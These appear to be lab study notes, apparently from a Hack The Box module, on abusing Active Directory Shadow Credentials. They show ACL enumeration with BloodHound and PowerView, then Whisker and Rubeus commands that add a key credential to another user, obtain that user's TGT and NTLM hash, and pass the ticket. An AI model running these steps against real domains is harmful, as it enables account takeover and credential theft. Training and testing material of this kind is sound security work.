
---
---
## Enumeration from Windows

To identify if we have an account with `GenericAll`, `GenericWrite`, over the target, or `WriteProperty` over the target's `msDS-KeyCredentialLink` attribute, we can use [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1), [BloodHound](https://github.com/SpecterOps/BloodHound), [dacledit](https://github.com/ShutdownRepo/impacket/tree/dacledit), and any other tool that allows us to retrieve ACL information out of Active Directory.

Let's start with [BloodHound](https://github.com/SpecterOps/BloodHound) and connect to the target machine using RDP with Jeffry's credentials.

To collect the data, we will use [SharpHound](https://github.com/BloodHoundAD/SharpHound):

```powershell
PS C:\Tools\SharpHound CE> .\SharpHound.exe -c All
```

We must import the SharpHound output file into BloodHound and then search for a path from Jeffry (the account we control) to any other account. Let's check the path from Jeffry to Gabriel:

![text](https://academy.hackthebox.com/storage/modules/255/jeffry_genericAll_gabriel.png)

There's also a path from Jeffry to Monic with `AddKeyCredentialLink`, this means that Jeffry has WriteProperty to this attribute:

![text](https://academy.hackthebox.com/storage/modules/255/jeffry_addkeycredentiallink_monic.png)

Aditionally, we can use [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) or [SharpView](https://github.com/tevora-threat/SharpView):

```powershell
PS C:\Tools> Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> $userSID = (Get-DomainUser -Identity jeffry).objectsid
PS C:\Tools> Get-DomainObjectAcl -Identity gabriel | ?{$_.SecurityIdentifier -eq $userSID}

ObjectDN       : CN=Gabriel,CN=Users,DC=lab,DC=local
ObjectSID      : S-1-5-21-2570265163-3918697770-3667495639-4602
ActiveDirectoryRights : GenericAll
BinaryLength     : 36
AceQualifier     : AccessAllowed
IsCallback      : False
OpaqueLength     : 0
AccessMask      : 983551
SecurityIdentifier  : S-1-5-21-2570265163-3918697770-3667495639-4601
AceType       : AccessAllowed
```

---
---
## Abusing Shadow Credentials from Windows

To abuse Shadow Credentials from Windows, we will use [Whisker](https://github.com/eladshamir/Whisker). We can use `Whisker.exe list /target:gabriel` to read the value of the `msDS-KeyCredentialLink` attribute of the target.

```powershell
PS C:\Tools> .\Whisker.exe list /target:gabriel
[*] Searching for the target account
[*] Target user found: CN=Gabriel,CN=Users,DC=lab,DC=local
[*] Listing deviced for gabriel:
    DeviceID: 462d7a93-f342-a139-96fc-2c750d2f4c89 | Creation Time: 27/04/2024 18:01:17
```

We found one key in this account. To add new credentials, we have two options: We can provide a certificate file that will be used as the alternative credentials for the account, or we can use `.\Whisker.exe add /target:gabriel` to generate the certificate and print the `Rubeus` command needed to retrieve the account's TGT and NTLM hash.

```powershell
PS C:\Tools> .\Whisker.exe add /target:gabriel
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password cw7I7QaHMS44q5xt
[*] Searching for the target account
[*] Target user found: CN=Gabriel,CN=Users,DC=lab,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 48d97546-cac9-4e92-981b-e89da231f7a8
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:gabriel /certificate:MIIJuAIBAzCCCXQGC..SNIP...6F9yJkzw28UnNcCs/0aclXHfAwICB9A= /password:"cw7I7QaHMS44q5xt" /domain:lab.local /dc:LAB-DC.lab.local /getcredentials /show
```

Now we can run `Rubeus` to get the TGT and NTLM hash. We must use the option `/getcredentials` to retrieve the NTLM hash:

```powershell
PS C:\Tools> .\Rubeus.exe asktgt /user:gabriel /certificate:MIIJuAIBAzCCCXQGC..SNIP...6F9yJkzw28UnNcCs/0aclXHfAwICB9A= /password:"cw7I7QaHMS44q5xt" /domain:lab.local /dc:LAB-DC.lab.local /getcredentials /show /nowrap
```

Now, we have two options for using the output provided by Rubeus: we can use the NT Hash with any of our preferred tools or Gabriel's TGT. Let's use the ticket with Rubeus.

One of the different methods we can use is to create a sacrificial logon session using the Rubeus option `createnetonly`:

```powershell
PS C:\Tools> .\Rubeus.exe createnetonly /program:powershell.exe /show
  ______    _
 (_____ \   | |
  _____) )_ _| |__ _____ _ _ ___
 | __ /| | | | _ \| ___ | | | |/___)
 | | \ \| |_| | |_) ) ____| |_| |___ |
 |_| |_|____/|____/|_____)____/(___/

 v2.3.2

[*] Action: Create Process (/netonly)

[*] Using random username and password.

[*] Showing process : True
[*] Username    : TSRS8WIH
[*] Domain     : EW74A3R2
[*] Password    : 85Y3U0HS
[+] Process    : 'powershell.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID   : 3456
[+] LUID      : 0x250d07
```

When we specify the option `/show`, it will display the process we executed. In this case, we run `powershell.exe`. In the new PowerShell window, we need to use `Rubeus ptt` with the option `/ticket:<BASE64 output>` to perform a Pass the Ticket attack:

```powershell
PS C:\Tools> .\Rubeus.exe ptt /ticket:doIGJjCCBiKgAwIBBaEDAgEWooIFRTCCBUFhggU9MIIFOaADA...SNIP...
```

Now, this PowerShell process has Gabriel's TGT, meaning we can use his privileges.

---
---

## Other actions with Whisker

We can use `.\Whisker.exe list /target:gabriel` to list the value of the new credential:

```powershell
PS C:\Tools> .\Whisker.exe list /target:gabriel
[*] Searching for the target account
[*] Target user found: CN=Gabriel,CN=Users,DC=lab,DC=local
[*] Listing deviced for gabriel:
  DeviceID: 462d7a93-f342-a139-96fc-2c750d2f4c89 | Creation Time: 27/04/2024 18:01:17
  DeviceID: 48d97546-cac9-4e92-981b-e89da231f7a8 | Creation Time: 15/02/2024 15:42:55
```

Additionally, we can use the option `remove` to delete a specific value from the `msDS-KeyCredentialLink` attribute or the option `clear` to remove all values.

```powershell
PS C:\Tools> .\Whisker.exe remove /target:gabriel /deviceid:48d97546-cac9-4e92-981b-e89da231f7a8
[*] Searching for the target account
[*] Target user found: CN=Gabriel,CN=Users,DC=lab,DC=local
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Found value to remove
[+] Updated the msDS-KeyCredentialLink attribute of the target object
```

> Note !

```c
Note: Clearing the msDS-KeyCredentialLink attribute of accounts configured for passwordless authentication will cause disruptions.
```


---
---

[AD-Attacks-Blog](https://happycamper84.medium.com/)
[AD/RedTeaming](https://notes.qazeer.io/active-directory/exploitation-acl_exploiting)
